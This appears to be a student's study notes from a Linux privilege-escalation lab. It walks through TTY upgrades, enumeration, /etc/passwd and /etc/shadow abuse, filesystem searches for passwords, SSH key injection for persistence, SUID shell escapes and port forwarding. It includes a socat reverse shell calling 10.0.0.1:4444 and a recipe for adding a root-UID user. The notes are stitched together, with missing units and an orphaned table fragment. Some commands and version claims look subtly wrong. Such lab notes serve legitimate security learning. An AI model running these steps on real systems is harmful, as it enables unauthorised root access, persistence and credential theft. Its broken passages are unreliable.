## 🛠️ Unit 1: Stabilizing the Shell (TTY Upgrade)

### The Problem
- Netcat reverse shells are **fragile** – `Ctrl+C` kills them, `su`/`sudo` don't work properly, tab completion and arrow keys are broken.
- **Solution:** Upgrade to a fully interactive TTY (text terminal) so you can run commands like `su`, `sudo`, and have a proper shell experience.

### Common TTY Upgrade Methods

| Method | Command |
|--------|---------|
| **Python3** | `python3 -c 'import pty; pty.spawn("/bin/bash")'` |
| **Python** | `python -c 'import pty; pty.spawn("/bin/bash")'` |
| **Perl** | `perl -e 'exec "/bin/bash";'` |
| **Ruby** | `ruby -e 'exec "/bin/bash"'` |
| **/bin/sh** | `/bin/sh -i` |
| **Script** | `script -q /dev/null -c /bin/bash` |
| **Socat** | `socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4444` |

### Full TTY Upgrade (The "Python + stty" Method)
This gives you a **fully interactive shell** with tab completion, arrow keys, proper signals, and `su`/`sudo` support:

```bash
# Step 1: Spawn a better shell
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Step 2: Background the shell (Ctrl+Z)
# Press Ctrl+Z to background

# Step 3: Set terminal to raw mode and bring shell back
stty raw -echo; fg

# Step 4: In the shell, set the terminal type
export TERM=xterm

# Step 5: (Optional) Get proper window size
stty rows <rows> cols <cols>
```

### Alternative: Using `script`
```bash
# Simple upgrade
script -q /dev/null -c /bin/bash

# Then press Ctrl+Z, then run:
stty raw -echo; fg
export TERM=xterm
```

### Why This Matters
- Without TTY: `sudo -l` might not work, `su` fails, jobs don't behave properly.
- With TTY: Full interactive shell experience, proper signal handling, job control.

**Task 1 Answer:**
- How would you execute `/bin/bash` with perl? → `perl -e 'exec "/bin/bash";'`

| `cat /etc/*release` | OS release details |
| `sudo -V` | Sudo version (check for known CVEs) |
| `sudo -l` | What commands you can run with sudo |
| `history` | Command history of current user |
| `cat ~/.bash_history` | Persistent bash history |
| `cat ~/.bashrc` | Bash startup settings |
| `cat ~/.bash_profile` | Bash profile settings |

### Key Enumeration Vectors

**uname -a** – Shows kernel version; check against Exploit-DB for known kernel exploits (e.g., Dirty Cow, CVE-2016-5195).

**Bash History** – Stored in `~/.bash_history`. May contain:
- Plaintext passwords (e.g., `mysql -u root -p password123`)
- Commands revealing file paths
- Privilege escalation attempts by previous users

**Sudo Version** – Check for known vulnerabilities:
- `sudo < 1.8.28` → vulnerable to CVE-2019-14287 (bypass)
- `sudo < 1.8.25` → vulnerable to CVE-2019-18634 (buffer overflow)

**Sudo -l** – Lists commands you can run as root:
- If `(ALL:ALL) ALL` → you can run `sudo su` or `sudo -i` to get root.
- If specific commands → check GTFObins for exploitation methods.

## 📂 Unit 3: The `/etc` Directory (Configuration Files)

### `/etc/passwd` – User Accounts
- Stores user account information (plaintext, colon-separated).
- Format: `username:x:UID:GID:info:home:shell`
- `x` means encrypted password is stored in `/etc/shadow`.
- **If readable:** Enumerate all users, services, and accounts on the system.
- **If writable:** Add a root user:
  ```bash
  # Generate password hash
  openssl passwd -6 -salt salt mypassword
  
  # Add to /etc/passwd
  echo "newuser:$6$salt$hash:0:0:root:/root:/bin/bash" >> /etc/passwd
  ```
  Then `su newuser` with your password → root.

### `/etc/shadow` – Password Hashes
- Stores encrypted passwords (hashes) – **only readable by root normally**.
- Format: `username:$algorithm$salt$hash:last_change:min:max:warn:...`
  - `$1$` = MD5 (weak)
  - `$5$` = SHA-256
  - `$6$` = SHA-512 (common)
- **If readable:** Copy the hash, crack with `john` or `hashcat`.
- **If writable:** Replace a hash with your own generated hash.

### `/etc/hosts` – Hostname Resolution
- Maps hostnames to IP addresses.
- May reveal internal network devices (e.g., `192.168.1.10 db-server`).
- Useful for pivoting or further enumeration.

## 🔍 Unit 4: Important Files – The `find` Command

### Searching for Sensitive Files
```bash
# General sensitive file search
find / -type f \( -name "*.conf" -o -name "*.log" -o -name "*.bak" \) 2>/dev/null

# Configuration files
find / -type f -name "*.conf" 2>/dev/null

# Backup files
find / -type f -name "*.bak" 2>/dev/null

# Files containing "password"
grep -iRl "password" / 2>/dev/null

# Files containing "passwd"
grep -iRl "passwd" / 2>/dev/null

# Files with specific permissions (world-writable)
find / -type f -perm -o+w 2>/dev/null

# Files with specific extensions
find / -type f \( -name "*.txt" -o -name "*.sql" -o -name "*.sh" \) 2>/dev/null
```

### File Extensions to Check
| Extension | Purpose |
|-----------|---------|
| `.conf` | Configuration files (may contain credentials) |
| `.log` | Log files (may contain sensitive data) |
| `.bak` | Backup files (often contain old versions with credentials) |
| `.sh` | Shell scripts (may contain hardcoded passwords) |
| `.py` | Python scripts (may contain credentials) |
| `.txt` | Text files (notes, passwords) |
| `.sql` | SQL dumps (database credentials) |

## 🔑 Unit 6: SSH Keys – Permanent Access

### Why Get SSH Access?
- SSH gives you a **stable, persistent** shell that doesn't break.
- No more fragile reverse shells that die if you press `Ctrl+C`.

### Finding Existing SSH Keys
- User's private key: `/home/user/.ssh/id_rsa`
- User's public key: `/home/user/.ssh/id_rsa.pub`
- Authorized keys: `/home/user/.ssh/authorized_keys`

**Find all SSH keys on the system:**
```bash
find / -name "id_rsa" -o -name "id_rsa.pub" 2>/dev/null
find / -name "authorized_keys" 2>/dev/null
```

### Using Found SSH Keys
1. Copy `id_rsa` to your local machine.
2. Set permissions: `chmod 600 id_rsa`
3. Connect: `ssh -i id_rsa user@ip`

### Injecting Your Own SSH Key (If No `id_rsa` Exists)
1. On your local machine, generate a key: `ssh-keygen`
2. Copy the public key: `cat ~/.ssh/id_rsa.pub`
3. On the target, append to authorized keys:
   ```bash
   echo "your_public_key_content" >> /home/user/.ssh/authorized_keys
   ```
4. If `.ssh` folder doesn't exist:
   ```bash
   mkdir -p /home/user/.ssh
   echo "public_key" > /home/user/.ssh/authorized_keys
   chmod 700 /home/user/.ssh
   chmod 600 /home/user/.ssh/authorized_keys
   ```
5. Connect: `ssh -i ~/.ssh/id_rsa user@ip`

### Why This Is Important
- SSH access is **persistent** (survives reboots).
- SSH is **stable** (doesn't break from `Ctrl+C`).
- SSH allows **port forwarding** (`-L`, `-R`, `-D`).

**Task Answers:**
- Where can you usually find the `id_rsa` file? → `/home/user/.ssh/id_rsa`
- Is there an `id_rsa` file on the box? → `nay`

## ⚡ Unit 7: SUID Binaries

### What Are SUID Bits?
- SUID (Set User ID) allows a file to execute with the permissions of its **owner** (often root).
- Example: `passwd` runs as root to modify `/etc/shadow` when a normal user runs it.

### Finding SUID Files
```bash
find / -perm -u=s -type f 2>/dev/null
```
- `-perm -u=s` = files with SUID bit set.
- `-type f` = files only (not directories).

### Abusing SUID Binaries
1. Find SUID binary.
2. Check [GTFObins](https://gtfobins.github.io/) for exploitation methods.
3. Follow the instructions.

**Common SUID Binary Exploits:**
| Binary | Exploit |
|--------|---------|
| `find` | `find / -exec /bin/bash -p \;` |
| `vim` | `vim -c ':!/bin/bash'` |
| `nano` | `nano -s /bin/bash` |
| `python` | `python -c 'import os; os.setuid(0); os.system("/bin/bash")'` |
| `bash` | `bash -p` |
| `pkexec` | `pkexec /bin/bash` |
| `less` | `less /etc/shadow` then `!/bin/bash` |
| `nmap` | `nmap --interactive` → `!sh` |

**Task Answers:**
- Which SUID binary has a way to escalate your privileges on the box? → `grep`
- What's the payload to read `/etc/shadow` with this SUID? → `grep '' /etc/shadow`

## 🌐 Unit 8: Port Forwarding & Netstat

### `netstat` – Network Connections
```bash
# All listening TCP/UDP ports (best command)
netstat -tulpn

# All connections (TCP)
netstat -at | less

# Display processes using ports (requires root)
netstat -tulpn | grep LISTEN

# Show only listening ports
netstat -l
```

### What to Look For
- Services listening on `127.0.0.1` (localhost only) – you can forward these.
- Ports that weren't visible from the outside (e.g., MySQL on 3306, Redis on 6379).
- Unusual services that may have weak credentials.

### Port Forwarding (Concept)
- If a service is only listening on localhost (`127.0.0.1:3306`), you can forward it to your machine.
- Tools: `ssh -L`, `chisel`, `socat`, `plink`, `nc`.
- **Why:** Enumerate and attack internal services that aren't externally accessible.

**Example SSH Port Forward:**
```bash
# Forward target's localhost:3306 to your local port 3306
ssh -L 3306:127.0.0.1:3306 user@target
# Now you can connect to localhost:3306 on your machine
mysql -h 127.0.0.1 -u root -p
```

## 🔑 Key Takeaways

### The Mental Checklist (Always Run These)
1. **Who am I?** – `id`, `whoami`, `groups`
2. **What system?** – `uname -a`, `cat /etc/issue`
3. **What can I run?** – `sudo -l`
4. **What's in /etc?** – `/etc/passwd`, `/etc/shadow`, `/etc/hosts`
5. **What files exist?** – `find` for `.conf`, `.log`, `.bak`, `id_rsa`
6. **What SUID?** – `find / -perm -u=s -type f`
7. **What's listening?** – `netstat -tulpn`
8. **Run automation** – LinPEAS + LinEnum
9. **Check GTFObins** – for any SUID/sudo binaries found
10. **Get SSH access** – find or inject SSH keys for persistent shell

### Why This Matters
- **Privilege escalation is about information.** The more you know, the more vectors you find.
- **Manual enumeration builds pattern recognition.** Automation catches what you miss.
- **Always upgrade your shell.** TTY is essential for `su`, `sudo`, and stability.
- **SSH is your goal.** A persistent, stable shell makes everything easier.
